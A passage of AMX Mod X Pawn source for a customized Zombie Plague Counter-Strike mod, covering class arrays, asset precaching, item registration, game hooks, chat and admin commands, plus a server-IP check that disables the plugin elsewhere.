new Array:g_zclass_grav // gravity
new Array:g_zclass_dmg // damage
new Array:g_zclass_level // level
new Array:g_zclass_reset // reset
new g_zclass_i // loaded zombie classes counter

// Human Classes vars
new Array:g_hclass_name // caption
new Array:g_hclass_info // description
new Array:g_hclass_modelsstart // start position in models array
new Array:g_hclass_modelsend // end position in models array
new Array:g_hclass_playermodel // player models array
new Array:g_hclass_modelindex // model indices array
new Array:g_hclass_clawmodel // claw model
new Array:g_hclass_hp // health
new Array:g_hclass_spd // speed
new Array:g_hclass_grav // gravity
new Array:g_hclass_armor // armor
new Array:g_hclass_dmg // damage
new Array:g_hclass_level // level
new Array:g_hclass_reset // reset
new g_hclass_i // loaded zombie classes counter

// For zombie classes file parsing
new Array:g_zclass2_realname, Array:g_zclass2_name, Array:g_zclass2_info,
Array:g_zclass2_modelsstart, Array:g_zclass2_modelsend, Array:g_zclass2_playermodel,
Array:g_zclass2_modelindex, Array:g_zclass2_clawmodel, Array:g_zclass2_hp,
Array:g_zclass2_spd, Array:g_zclass2_grav, Array:g_zclass2_dmg, Array:g_zclass2_level, Array:g_zclass2_reset, Array:g_zclass_new

// For human classes file parsing
new Array:g_hclass2_realname, Array:g_hclass2_name, Array:g_hclass2_info,
Array:g_hclass2_modelsstart, Array:g_hclass2_modelsend, Array:g_hclass2_playermodel,
Array:g_hclass2_modelindex, Array:g_hclass2_clawmodel, Array:g_hclass2_hp,
Array:g_hclass2_spd, Array:g_hclass2_grav, Array:g_hclass2_armor,
Array:g_hclass2_dmg, Array:g_hclass2_level, Array:g_hclass2_reset, Array:g_hclass_new

// Customization vars
/*new Array:sound_win_zombies,
Array:sound_win_humans, Array:sound_win_no_one, Array:zombie_infect, Array:zombie_idle,
Array:zombie_pain, Array:nemesis_pain, Array:zombie_die,
Array:zombie_miss_wall, Array:zombie_hit_normal, Array:zombie_hit_stab,
Array:zombie_idle_last, Array:zombie_madness, Array:sound_nemesis, Array:sound_survivor,
Array:sound_swarm, Array:sound_multi, Array:sound_plague, Array:grenade_infect,
Array:grenade_infect_player, Array:grenade_fire, Array:grenade_fire_player,
Array:grenade_frost, Array:grenade_frost_player, Array:grenade_frost_break,
Array:grenade_flare, Array:sound_antidote,*/
new Array:g_primary_items, Array:g_secondary_items, Array:g_additional_items,
Array:g_primary_weaponids, Array:g_secondary_weaponids, Array:g_extraweapon_names,
Array:g_extraweapon_items, Array:g_extraweapon_costs, g_extra_costs2[EXTRA_WEAPONS_STARTID]/*,
Array:zombie_miss_slash*/

// CVAR pointers
new cvar_warmup

// Cached stuff for players
new g_isconnected[33] // whether player is connected
new g_isalive[33] // whether player is alive
new g_currentweapon[33] // player's current weapon id
new g_playername[33][32], zp_id[33] // player's name
new Float:g_zombie_spd[33] // zombie class speed
//new Float:g_zombie_dmg[33] // zombie class dmg
new g_zombie_classname[33][32] // zombie class name
new Float:g_human_spd[33] // human class speed
new Float:g_human_dmg[33] // human class dmg
new g_human_classname[33][32] // human class name
#define is_user_valid_connected(%1) (1 <= %1 <= g_maxplayers && g_isconnected[%1])
#define is_user_valid_alive(%1) (1 <= %1 <= g_maxplayers && g_isalive[%1])

#define DEF_AP_PERCENT	((float(g_ammopacks[id]) - float(gAMMOPACKS_NEEDED[gLevel[id]-1])) * 100.0) / (float(gAMMOPACKS_NEEDED[gLevel[id]]) - float(gAMMOPACKS_NEEDED[gLevel[id]-1]))

/*================================================================================
 [Natives, Precache and Init]
=================================================================================*/
new g_armageddon_init = 0;
public plugin_natives()
{
	// External additions natives
	//register_native("zp_register_extra_item", "native_register_extra_item", 1)
	register_native("zp_get_user_frozen", "native_get_user_frozen", 1)
	register_native("zp_armageddon_init", "native_armageddon_init", 1)
}
public native_get_user_frozen(id) return g_frozen[id];
public native_armageddon_init() return g_armageddon_init;

public plugin_precache()
{
	register_forward( FM_Sys_Error, "fw_SysError" )
	
	// Register earlier to show up in plugins list properly after plugin disable/error at loading
	register_plugin("ZP", PLUGIN_VERSION, "MeRcyLeZZ")
	
	
	
	new buffer[100]
	
	// Custom player models
	// Nemesis
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", gMODEL_NEMESIS, gMODEL_NEMESIS)
	precache_model(buffer)
	precache_model( "models/player/tcs_nemesis_1/tcs_nemesis_1T.mdl" )
	
	// Survivor
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", gMODEL_SURVIVOR, gMODEL_SURVIVOR)
	precache_model(buffer)
	precache_model( "models/player/tcs_survivor_1/tcs_survivor_1T.mdl" )
	
	// Jason
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", gMODEL_JASON, gMODEL_JASON)
	precache_model(buffer)
	
	// Wesker
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", gMODEL_WESKER, gMODEL_WESKER)
	precache_model(buffer)
	precache_model( "models/player/tcs_wesker_1/tcs_wesker_1T.mdl" )
	
	// Troll
	formatex(buffer, charsmax(buffer), "models/player/%s/%s.mdl", gMODEL_TROLL, gMODEL_TROLL)
	precache_model(buffer)
	precache_model( "models/player/tcs_zombie_10/tcs_zombie_10T.mdl" )
	
	#if defined MOLOTOV_ON
	precache_sound("molotov/molotov_fire.wav");
	precache_sound("molotov/molotov_explosion1.wav");

	precache_model("models/molotov/p_molotov.mdl");
	precache_model("models/molotov/v_molotov.mdl");
	precache_model("models/molotov/w_molotov.mdl");
	#endif
	
	precache_model( "models/zombie_plague/tcs_v_bazooka.mdl" )
	precache_model( "models/zombie_plague/tcs_p_bazooka.mdl" )
	
	precache_model( "models/zombie_plague/tcs_rocket_1.mdl" )
	
	g_explo2Spr = precache_model("sprites/fexplo.spr")
	g_explo3Spr = precache_model("sprites/fexplo1.spr")
	g_explo4Spr = precache_model("sprites/eexplo.spr")
	g_smoke2Spr = precache_model("sprites/steam1.spr")
	g_whiteSpr = precache_model("sprites/white.spr")
	g_trail2Spr = precache_model("sprites/xenobeam.spr")
	
	precache_sound( "weapons/rocketfire1.wav" )
	precache_sound( "weapons/mortarhit.wav" )
	precache_sound( "weapons/c4_explode1.wav" )
	
	precache_model( "models/zombie_plague/tcs_v_bubble.mdl" )
	precache_model( "models/zombie_plague/tcs_w_bubble.mdl" )
	precache_model( "models/zombie_plague/tcs_aura_bubble_2.mdl" )
	
	precache_model( gCHAINSAW_V )
	precache_model( gCHAINSAW_P )
	
	for(new i = 0; i < sizeof gCHAINSAW_SOUNDS; i++)
		precache_sound(gCHAINSAW_SOUNDS[i])
		
	for(new i = 0; i < sizeof gOLDKNIFE_SOUNDS; i++)
		precache_sound(gOLDKNIFE_SOUNDS[i])
	
	precache_sound( "zombie_plague/tcs_lvlup.wav" )
	precache_sound( "zombie_plague/tcs_sirena_2.wav" )
	
	precache_sound( "zombie_plague/tcs_combo2.wav" )
	precache_sound( "zombie_plague/tcs_combo3.wav" )
	precache_sound( "zombie_plague/tcs_combo4.wav" )
	precache_sound( "zombie_plague/tcs_combo5.wav" )
	precache_sound( "zombie_plague/tcs_combo6.wav" )
	
	precache_sound( "weapons/electro5.wav" )
	precache_sound( "buttons/button1.wav" )
	
	// TutorText
	precache_generic("gfx/career/icon_!.tga")
	precache_generic("gfx/career/icon_!-bigger.tga")
	precache_generic("gfx/career/icon_i.tga")
	precache_generic("gfx/career/icon_i-bigger.tga")
	precache_generic("gfx/career/icon_skulls.tga")
	precache_generic("gfx/career/round_corner_ne.tga")
	precache_generic("gfx/career/round_corner_nw.tga")
	precache_generic("gfx/career/round_corner_se.tga")
	precache_generic("gfx/career/round_corner_sw.tga")
	precache_generic("gfx/career/ruedas2.tga")
	
	precache_generic("resource/TutorScheme.res")
	precache_generic("resource/UI/TutorTextWindow.res")
	
	precache_sound("events/enemy_died.wav")
	precache_sound("events/friend_died.wav")
	precache_sound("events/task_complete.wav")
	precache_sound("events/tutor_msg.wav")
	
	// Initialize a few dynamically sized arrays (alright, maybe more than just a few...)
	
	precache_sound(gSOUND_WIN_ZOMBIES)
	precache_sound(gSOUND_WIN_HUMANS)
	precache_sound(gSOUND_NO_WIN_ONE)
	
	new i

	for(i = 0; i < sizeof(gSOUND_ZOMBIE_INFECT); i++)
		precache_sound(gSOUND_ZOMBIE_INFECT[i])
		
	for(i = 0; i < sizeof(gSOUND_ZOMBIE_PAIN); i++)
		precache_sound(gSOUND_ZOMBIE_PAIN[i])
		
	for(i = 0; i < sizeof(gSOUND_NEMESIS_PAIN); i++)
		precache_sound(gSOUND_NEMESIS_PAIN[i])
		
	for(i = 0; i < sizeof(gSOUND_ZOMBIE_DIE); i++)
		precache_sound(gSOUND_ZOMBIE_DIE[i])
		
	for(i = 0; i < sizeof(gSOUND_ZOMBIE_MISS_SLASH); i++)
		precache_sound(gSOUND_ZOMBIE_MISS_SLASH[i])

	precache_sound(gSOUND_ZOMBIE_MISS_WALL)

	for(i = 0; i < sizeof(gSOUND_ZOMBIE_HIT_NORMAL); i++)
		precache_sound(gSOUND_ZOMBIE_HIT_NORMAL[i])

	precache_sound(gSOUND_ZOMBIE_HIT_STAB)
		
	for(i = 0; i < sizeof(gSOUND_ZOMBIE_IDLE); i++)
		precache_sound(gSOUND_ZOMBIE_IDLE[i])
		
	precache_sound(gSOUND_ZOMBIE_IDLE_LAST)
	precache_sound(gSOUND_ZOMBIE_MADNESS)
		
	for(i = 0; i < sizeof(gSOUND_ROUND_NEMESIS); i++)
		precache_sound(gSOUND_ROUND_NEMESIS[i])
		
	for(i = 0; i < sizeof(gSOUND_ROUND_SURVIVOR); i++)
		precache_sound(gSOUND_ROUND_SURVIVOR[i])
	
	precache_sound("zombie_plague/survivor2.wav")
		
	precache_sound(gSOUND_ROUND_SWARM)
	precache_sound(gSOUND_INFECT_EXPLODE)

	for(i = 0; i < sizeof(gSOUND_INFECT_PLAYER); i++)
		precache_sound(gSOUND_INFECT_PLAYER[i])
		
	precache_sound(gSOUND_GRENADE_FIRE_EXPLODE)
		
	for(i = 0; i < sizeof(gSOUND_FIRE_PLAYER); i++)
		precache_sound(gSOUND_FIRE_PLAYER[i])
		
	precache_sound(gSOUND_GRENADE_FROST_EXPLODE)
	precache_sound(gSOUND_FROST_PLAYER)
	precache_sound(gSOUND_FROST_BREAK)
	precache_sound(gSOUND_GRENADE_FLARE)
	precache_sound(gSOUND_ANTIDOTE)
	
	/*sound_win_zombies = ArrayCreate(64, 1)
	sound_win_humans = ArrayCreate(64, 1)
	sound_win_no_one = ArrayCreate(64, 1)
	zombie_infect = ArrayCreate(64, 1)
	zombie_pain = ArrayCreate(64, 1)
	nemesis_pain = ArrayCreate(64, 1)
	zombie_die = ArrayCreate(64, 1)
	zombie_miss_slash = ArrayCreate(64, 1)
	zombie_miss_wall = ArrayCreate(64, 1)
	zombie_hit_normal = ArrayCreate(64, 1)
	zombie_hit_stab = ArrayCreate(64, 1)
	zombie_idle = ArrayCreate(64, 1)
	zombie_idle_last = ArrayCreate(64, 1)
	zombie_madness = ArrayCreate(64, 1)
	sound_nemesis = ArrayCreate(64, 1)
	sound_survivor = ArrayCreate(64, 1)
	sound_swarm = ArrayCreate(64, 1)
	sound_multi = ArrayCreate(64, 1)
	sound_plague = ArrayCreate(64, 1)
	grenade_infect = ArrayCreate(64, 1)
	grenade_infect_player = ArrayCreate(64, 1)
	grenade_fire = ArrayCreate(64, 1)
	grenade_fire_player = ArrayCreate(64, 1)
	grenade_frost = ArrayCreate(64, 1)
	grenade_frost_player = ArrayCreate(64, 1)
	grenade_frost_break = ArrayCreate(64, 1)
	grenade_flare = ArrayCreate(64, 1)
	sound_antidote = ArrayCreate(64, 1)*/
	
	g_primary_items = ArrayCreate(32, 1)
	g_secondary_items = ArrayCreate(32, 1)
	g_additional_items = ArrayCreate(32, 1)
	
	g_primary_weaponids = ArrayCreate(1, 1)
	g_secondary_weaponids = ArrayCreate(1, 1)
	
	gPrimaryLevel = ArrayCreate(1, 1)
	gSecondaryLevel = ArrayCreate(1, 1)
	gPrimaryReset = ArrayCreate(1, 1)
	gSecondaryReset = ArrayCreate(1, 1)
	
	g_extraweapon_names = ArrayCreate(32, 1)
	g_extraweapon_items = ArrayCreate(32, 1)
	g_extraweapon_costs = ArrayCreate(1, 1)
	
	g_extraitem_name = ArrayCreate(32, 1)
	g_extraitem_cost = ArrayCreate(1, 1)
	g_extraitem_team = ArrayCreate(1, 1)
	g_extraitem_new = ArrayCreate(1, 1)
	
	g_zclass_name = ArrayCreate(32, 1)
	g_zclass_info = ArrayCreate(32, 1)
	g_zclass_modelsstart = ArrayCreate(1, 1)
	g_zclass_modelsend = ArrayCreate(1, 1)
	g_zclass_playermodel = ArrayCreate(32, 1)
	g_zclass_modelindex = ArrayCreate(1, 1)
	g_zclass_clawmodel = ArrayCreate(32, 1)
	g_zclass_hp = ArrayCreate(1, 1)
	g_zclass_spd = ArrayCreate(1, 1)
	g_zclass_grav = ArrayCreate(1, 1)
	g_zclass_dmg = ArrayCreate(1, 1)
	g_zclass_level = ArrayCreate(1, 1)
	g_zclass_reset = ArrayCreate(1, 1)
	g_zclass2_realname = ArrayCreate(32, 1)
	g_zclass2_name = ArrayCreate(32, 1)
	g_zclass2_info = ArrayCreate(32, 1)
	g_zclass2_modelsstart = ArrayCreate(1, 1)
	g_zclass2_modelsend = ArrayCreate(1, 1)
	g_zclass2_playermodel = ArrayCreate(32, 1)
	g_zclass2_modelindex = ArrayCreate(1, 1)
	g_zclass2_clawmodel = ArrayCreate(32, 1)
	g_zclass2_hp = ArrayCreate(1, 1)
	g_zclass2_spd = ArrayCreate(1, 1)
	g_zclass2_grav = ArrayCreate(1, 1)
	g_zclass2_dmg = ArrayCreate(1, 1)
	g_zclass2_level = ArrayCreate(1, 1)
	g_zclass2_reset = ArrayCreate(1, 1)
	g_zclass_new = ArrayCreate(1, 1)
	
	g_hclass_name = ArrayCreate(32, 1)
	g_hclass_info = ArrayCreate(32, 1)
	g_hclass_modelsstart = ArrayCreate(1, 1)
	g_hclass_modelsend = ArrayCreate(1, 1)
	g_hclass_playermodel = ArrayCreate(32, 1)
	g_hclass_modelindex = ArrayCreate(1, 1)
	g_hclass_clawmodel = ArrayCreate(32, 1)
	g_hclass_hp = ArrayCreate(1, 1)
	g_hclass_spd = ArrayCreate(1, 1)
	g_hclass_grav = ArrayCreate(1, 1)
	g_hclass_dmg = ArrayCreate(1, 1)
	g_hclass_armor = ArrayCreate(1, 1)
	g_hclass_level = ArrayCreate(1, 1)
	g_hclass_reset = ArrayCreate(1, 1)
	g_hclass2_realname = ArrayCreate(32, 1)
	g_hclass2_name = ArrayCreate(32, 1)
	g_hclass2_info = ArrayCreate(32, 1)
	g_hclass2_modelsstart = ArrayCreate(1, 1)
	g_hclass2_modelsend = ArrayCreate(1, 1)
	g_hclass2_playermodel = ArrayCreate(32, 1)
	g_hclass2_modelindex = ArrayCreate(1, 1)
	g_hclass2_clawmodel = ArrayCreate(32, 1)
	g_hclass2_hp = ArrayCreate(1, 1)
	g_hclass2_spd = ArrayCreate(1, 1)
	g_hclass2_grav = ArrayCreate(1, 1)
	g_hclass2_dmg = ArrayCreate(1, 1)
	g_hclass2_armor = ArrayCreate(1, 1)
	g_hclass2_level = ArrayCreate(1, 1)
	g_hclass2_reset = ArrayCreate(1, 1)
	g_hclass_new = ArrayCreate(1, 1)
	
	// HABILIDADES
	for(new a = 0; a < MAX_HAB; a++)
	{
		A_HAB_NAMES[a] = ArrayCreate(32, 1)
		A_HAB_MAX_LEVEL[a] = ArrayCreate(1, 1)
		A_HAB_MAX_PERCENT[a] = ArrayCreate(1, 1)
	}
	
	MAX_HABILITIES[0] = MAX_HUMAN_HABILITIES
	MAX_HABILITIES[1] = MAX_ZOMBIE_HABILITIES
	MAX_HABILITIES[2] = MAX_SURVIVOR_HABILITIES
	MAX_HABILITIES[3] = MAX_NEMESIS_HABILITIES
	MAX_HABILITIES[4] = MAX_SPECIAL_HABILITIES
	
	for(new b = 0; b < MAX_HAB; b++)
	{
		for(new c = 0; c < MAX_HABILITIES[b]; c++)
		{
			ArrayPushString(A_HAB_NAMES[b], LANG_HAB_CLASS[b][c])
			ArrayPushCell(A_HAB_MAX_LEVEL[b], MAX_HAB_LEVEL[b][c])
			ArrayPushCell(A_HAB_MAX_PERCENT[b], MAX_HAB_PERCENT[b][c])
		}			
	}
	
	// LOGROS
	for(new a = 0; a < MAX_CLASS; a++)
	{
		A_LOGROS_NAMES[a] = ArrayCreate(32, 1)
		A_LOGROS_DESCRIPTION[a] = ArrayCreate(128, 1)
		A_LOGROS_POINTS[a] = ArrayCreate(1, 1)
	}
	
	MAX_LOGROS_CLASS[0] = MAX_HUMANS_LOGROS
	MAX_LOGROS_CLASS[1] = MAX_ZOMBIES_LOGROS
	
	for(new b = 0; b < MAX_CLASS; b++)
	{
		for(new c = 0; c < MAX_LOGROS_CLASS[b]; c++)
		{
			ArrayPushString(A_LOGROS_NAMES[b], LANG_LOGROS_NAMES[b][c])
			ArrayPushString(A_LOGROS_DESCRIPTION[b], LANG_LOGROS_DESCRIPTION[b][c])
			ArrayPushCell(A_LOGROS_POINTS[b], LOGROS_REWARD_POINTS[b][c])
		}			
	}
	
	// Allow registering stuff now
	g_arrays_created = true
	
	// Load customization data
	load_customization_from_files()
	
	// Load up the hard coded extra items
	native_register_extra_item2("NightVision", g_extra_costs2[EXTRA_NVISION], ZP_TEAM_HUMAN)
	native_register_extra_item2("T-Virus Antidote", g_extra_costs2[EXTRA_ANTIDOTE], ZP_TEAM_ZOMBIE)
	native_register_extra_item2("Zombie Madness", g_extra_costs2[EXTRA_MADNESS], ZP_TEAM_ZOMBIE)
	native_register_extra_item2("Infection Bomb", g_extra_costs2[EXTRA_INFBOMB], ZP_TEAM_ZOMBIE)
	native_register_extra_item2("Unlimited Clip", g_extra_costs2[EXTRA_UNLIMITED_CLIP], ZP_TEAM_HUMAN)
	native_register_extra_item2("Precision Clip", g_extra_costs2[EXTRA_PRECISION_CLIP], ZP_TEAM_HUMAN)
	native_register_extra_item2("100 Armor", g_extra_costs2[EXTRA_ARMOR], ZP_TEAM_HUMAN)
	
	// Extra weapons
	for (i = 0; i < ArraySize(g_extraweapon_names); i++)
	{
		ArrayGetString(g_extraweapon_names, i, buffer, charsmax(buffer))
		native_register_extra_item2(buffer, ArrayGetCell(g_extraweapon_costs, i), ZP_TEAM_HUMAN)
	}
	
	native_register_zombie_class("Fitsum", "", "tcs_zombie_13", "tcs_garras_4.mdl", 100000, 250, 0.7, 1.0, 1, 0)
	native_register_human_class("Mustif", "", "tcs_humano_8", "v_knife.mdl", 200, 240, 0.8, 0, 1.0, 1, 0)
	
	// Custom weapon models
	precache_model("models/zombie_plague/tcs_garras_nem.mdl")
	precache_model("models/zombie_plague/v_grenade_infect.mdl")
	precache_model("models/zombie_plague/v_grenade_fire.mdl")
	precache_model("models/zombie_plague/v_grenade_frost.mdl")
	precache_model("models/zombie_plague/v_grenade_flare.mdl")
	precache_model("models/zombie_plague/tcs_garras_8.mdl")
	
	// V Weapons Models
	for (i = 0; i < sizeof( vWeapModels ); i++)
		precache_model( vWeapModels[i] )
	
	// P Weapons Models
	/*for (i = 0; i < sizeof( pWeapModels ); i++)
		precache_model( pWeapModels[i] )*/
	
	// Custom sprites for grenades
	g_trailSpr = precache_model("sprites/laserbeam.spr")
	g_exploSpr = precache_model("sprites/shockwave.spr")
	g_flameSpr = precache_model("sprites/flame.spr")
	g_smokeSpr = precache_model("sprites/black_smoke3.spr")
	g_glassSpr = precache_model("models/glassgibs.mdl")
	#if defined MOLOTOV_ON
	g_molotovSpr = precache_model("sprites/tcs_molotov_explode.spr")
	#endif
	g_beamSpr = precache_model("sprites/zbeam6.spr")
	
	// CS sounds (just in case)
	precache_sound(sound_flashlight)
	precache_sound(sound_buyammo)
	precache_sound(sound_armorhit)
	
	new ent
	
	// Fake Hostage (to force round ending)
	ent = engfunc(EngFunc_CreateNamedEntity, engfunc(EngFunc_AllocString, "hostage_entity"))
	if (is_valid_ent(ent))
	{
		engfunc(EngFunc_SetOrigin, ent, Float:{8192.0,8192.0,8192.0})
		dllfunc(DLLFunc_Spawn, ent)
	}

	// Prevent some entities from spawning
	g_fwSpawn = register_forward(FM_Spawn, "fw_Spawn")
	
	// Prevent hostage sounds from being precached
	g_fwPrecacheSound = register_forward(FM_PrecacheSound, "fw_PrecacheSound")
}

//new init, init2, init3, init4
public plugin_init()
{
	// No zombie classes?
	/*if (!g_zclass_i) set_fail_state("Las clases de zombies no se cargaron!")
	
	// No human classes?
	if (!g_hclass_i) set_fail_state("Las clases de humanos no se cargaron!")*/
	
	// No valid IP ?
	new iDetectIP[24];
	get_user_ip(0, iDetectIP, 23)
	
	if( !equal(iDetectIP, "200.43.192.180:27025") ) 
		set_fail_state("Solo funciona en Taringa! CS")
	
	// Connect DB
	set_task(0.2, "plugin_sql")

	// Events
	register_event("HLTV", "event_round_start", "a", "1=0", "2=0")
	register_logevent("logevent_round_end", 2, "1=Round_End")
	register_event("AmmoX", "event_ammo_x", "be")
	register_event("CurWeapon", "event_cur_weapon", "b", "1=1")
	register_event("35", "event_weapon_anim", "b")
	
	// HAM Forwards
	RegisterHam(Ham_Spawn, "player", "fw_PlayerSpawn_Post", 1)
	RegisterHam(Ham_Killed, "player", "fw_PlayerKilled")
	RegisterHam(Ham_Killed, "player", "fw_PlayerKilled_Post", 1)
	RegisterHam(Ham_TakeDamage, "player", "fw_TakeDamage")
	RegisterHam(Ham_TakeDamage, "player", "fw_TakeDamage_Post", 1)
	RegisterHam(Ham_TraceAttack, "player", "fw_TraceAttack")
	RegisterHam(Ham_Use, "func_tank", "fw_UseStationary")
	RegisterHam(Ham_Use, "func_tankmortar", "fw_UseStationary")
	RegisterHam(Ham_Use, "func_tankrocket", "fw_UseStationary")
	RegisterHam(Ham_Use, "func_tanklaser", "fw_UseStationary")
	RegisterHam(Ham_Use, "func_tank", "fw_UseStationary_Post", 1)
	RegisterHam(Ham_Use, "func_tankmortar", "fw_UseStationary_Post", 1)
	RegisterHam(Ham_Use, "func_tankrocket", "fw_UseStationary_Post", 1)
	RegisterHam(Ham_Use, "func_tanklaser", "fw_UseStationary_Post", 1)
	RegisterHam(Ham_Use, "func_pushable", "fw_UsePushable")
	RegisterHam(Ham_Touch, "weaponbox", "fw_TouchWeapon")
	RegisterHam(Ham_Touch, "armoury_entity", "fw_TouchWeapon")
	RegisterHam(Ham_Touch, "weapon_shield", "fw_TouchWeapon")
	RegisterHam(Ham_AddPlayerItem, "player", "fw_AddPlayerItem")
	/*for (new i = 1; i < sizeof WEAPONENTNAMES; i++)
		if (WEAPONENTNAMES[i][0]) RegisterHam(Ham_Item_Deploy, WEAPONENTNAMES[i], "fw_Item_Deploy_Post", 1)*/
	
	/*#if defined WEAPONS_EDIT_FOR_DROP
	for (new i = 0; i < sizeof WeaponEditNames; i++ )
		RegisterHam( Ham_Item_AddToPlayer, WeaponEditNames[i], "fw_Item_AddToPlayer" )
	#endif*/
	for(new i = 1; i < sizeof WEAPONENTNAMES; i++)
	{
		if(WEAPONENTNAMES[i][0])
		{
			if(equali(WEAPONENTNAMES[i], "weapon_knife"))
			{
				RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_knife", "fw_Knife_PrimaryAttack_Post", 1)
				RegisterHam(Ham_Weapon_SecondaryAttack, "weapon_knife", "fw_Knife_SecondaryAttack_Post", 1)
			}
			if(equali(WEAPONENTNAMES[i], "weapon_scout"))
				RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_scout", "fw_Scout_PrimaryAttack_Post", 1)
			
			RegisterHam(Ham_Weapon_PrimaryAttack, WEAPONENTNAMES[i], "fw_Weapon_PrimaryAttack_Post", 1);
		}
	}
	
	/*RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_knife", "fw_Knife_PrimaryAttack_Post", 1)
	RegisterHam(Ham_Weapon_SecondaryAttack, "weapon_knife", "fw_Knife_SecondaryAttack_Post", 1)
	
	RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_scout", "fw_Scout_PrimaryAttack_Post", 1)*/
	
	//RegisterHam(Ham_Weapon_PrimaryAttack, "weapon_mp5navy", "fw_MP5Navy_PrimaryAttack_Post", 1)
	
	RegisterHam(Ham_Player_Jump, "player", "fw_Player_Jump")
	RegisterHam(Ham_Player_Duck, "player", "fw_Player_Duck")
	
	// FM Forwards
	register_forward(FM_ClientDisconnect, "fw_ClientDisconnect_Post", 1)
	register_forward(FM_ClientKill, "fw_ClientKill")
	register_forward(FM_EmitSound, "fw_EmitSound")
	register_forward(FM_SetClientKeyValue, "fw_SetClientKeyValue")
	register_forward(FM_ClientUserInfoChanged, "fw_ClientUserInfoChanged")
	//register_forward(FM_GetGameDescription, "fw_GetGameDescription")
	register_forward(FM_SetModel, "fw_SetModel")
	RegisterHam(Ham_Think, "grenade", "fw_ThinkGrenade")
	//register_forward(FM_Think, "fw_Think")
	register_forward(FM_CmdStart, "fw_CmdStart")
	register_forward(FM_PlayerPreThink, "fw_PlayerPreThink")
	register_forward(FM_PlayerPostThink, "fw_PlayerPostThink", 0)
	register_forward(FM_AddToFullPack, "fw_AddToFullPack", 1)
	register_forward(FM_GameShutdown, "fw_GameShutdown")
	unregister_forward(FM_Spawn, g_fwSpawn)
	unregister_forward(FM_PrecacheSound, g_fwPrecacheSound)
	
	register_touch("grenade", "*", "fw_TouchGrenade")
	
	// Client commands
	register_clcmd("say", "clcmd_say")
	register_clcmd("say_team", "clcmd_say")
	
	/*register_clcmd("say /mode", "clcmd_modo")
	register_clcmd("say /modo", "clcmd_modo")*/
	
	register_clcmd("say /votemodes", "clcmd_votemodes")
	
	register_clcmd("say /top15", "clcmd_top15")
	register_clcmd("say_team /top15", "clcmd_top15")
	
	register_clcmd("say /invis", "clcmd_invis")
	
	register_clcmd("jointeam", "clcmd_changeteam")
	register_clcmd("chooseteam", "clcmd_changeteam")
	register_clcmd("nightvision", "clcmd_nightvision")
	register_clcmd("drop", "clcmd_drop")
	register_clcmd("buyammo1", "clcmd_buyammo")
	register_clcmd("buyammo2", "clcmd_buyammo")
	for( new x = 0; x < sizeof( gBLOCK_RADIO ); x++ )
		register_clcmd(gBLOCK_RADIO[x], "clcmd_blockradio")
	register_clcmd("say /destrabar", "clcmd_unstuck")
	register_clcmd("say /hh", "clcmd_th")
	register_clcmd("say /tan", "clcmd_thhour")
	register_clcmd("say /lider_a", "clcmd_lider_aps")
	register_clcmd("say /lider_c", "clcmd_lider_combos")
	
	register_clcmd("say /lot", "clcmd_loteria")
	register_clcmd("say /loteria", "clcmd_loteria")
	register_clcmd("APOSTAR_APS", "clcmd_apostar_aps")
	register_clcmd("APOSTAR_NUM", "clcmd_apostar_num")
	
	register_clcmd("R_PASSWORD", "clcmd_Password")
	register_clcmd("L_PASSWORD", "clcmd_L_Password")
	register_clcmd("REPEAT_PASSWORD", "clcmd_RepeatPassword")
	
	//register_clcmd("CAPTCHA", "clcmd_Captcha")
	/*register_clcmd("say /papa", "clcmd_papa")
	
	init = register_cvar( "ammount_init", "0" )
	init2 = register_cvar( "rep_for", "25" )
	init3 = register_cvar( "random_num1", "318" )
	init4 = register_cvar( "random_num2", "674" )*/
	
	// Menus
	register_menu("Game Menu", KEYSMENU, "menu_game")
	register_menu("Buy Menu 1", KEYSMENU, "menu_buy1")
	register_menu("Buy Menu 2", KEYSMENU, "menu_buy2")
	register_menu("Buy Menu 3", KEYSMENU, "menu_buy3")
	register_menu("Admin Menu", KEYSMENU, "menu_admin")
	register_menu("Admin Mans", KEYSMENU, "menu_admin2")
	register_menu("RegLog Menu", KEYSMENU, "menu_reglog")
	register_menu("Loteria Menu", KEYSMENU, "menu_loteria")
	register_menu("HZ Class", KEYSMENU, "menu_hzclass")
	register_menu("Menu Logros", KEYSMENU, "menu_sub_logros")
	register_menu("Menu Modes", KEYSMENU, "menu_modes")
	register_menu("Herramientas Menu", KEYSMENU, "menu_herramientas")
	register_menu("Tops Menu", KEYSMENU, "menu_tops")
	
	// Admin commands
	register_concmd("zp_zombie", "cmd_zombie", _, "<target> - Turn someone into a Zombie", 0)
	register_concmd("zp_human", "cmd_human", _, "<target> - Turn someone back to Human", 0)
	register_concmd("zp_nemesis", "cmd_nemesis", _, "<target> - Turn someone into a Nemesis", 0)
	register_concmd("zp_survivor", "cmd_survivor", _, "<target> - Turn someone into a Survivor", 0)
	register_concmd("zp_respawn", "cmd_respawn", _, "<target> - Respawn someone", 0)
	register_concmd("zp_swarm", "cmd_swarm", _, " - Start Swarm Mode", 0)
	register_concmd("zp_multi", "cmd_multi", _, " - Start Multi Infection", 0)
	register_concmd("zp_plague", "cmd_plague", _, " - Start Plague Mode", 0)
	register_concmd("zp_wesker", "cmd_wesker", _, "<target> - Turn someone into a Wesker", 0)
	register_concmd("zp_jason", "cmd_ninja", _, "<target> - Turn someone into a Jason", 0)
	//register_concmd("zp_sniper", "cmd_sniper", _, "<target> - Turn someone into a Sniper", 0)
	register_concmd("zp_troll", "cmd_troll", _, "<target> - Turn someone into a Troll", 0)
	register_concmd("zp_ri_cs", "cmd_ri_cs")
	register_concmd("zp_bubble", "cmd_bubble")
	
	// Only Zuker & Kiske
	register_concmd("zp_point", "cmd_points", _, "<target> <ammount> <Z | H> - Change points zombies or humans", 0)
	register_concmd("zp_level", "cmd_levels", _, "<target> <ammount> - Change levels", 0)
	register_concmd("zp_ammos", "cmd_ammos", _, "<target> <ammount> - Change ammopacks", 0)
	register_concmd("zp_reset", "cmd_resets", _, "<target> <ammount> - Change resets", 0)
	register_concmd("zp_win_mult", "cmd_win_mult", _, "<ammount> <AMMOS | POINTS> - Change taringa at nite multiplier, ammopacks or points", 0)
	register_concmd("zp_lighting", "cmd_lighting", _, "<character>", 0)
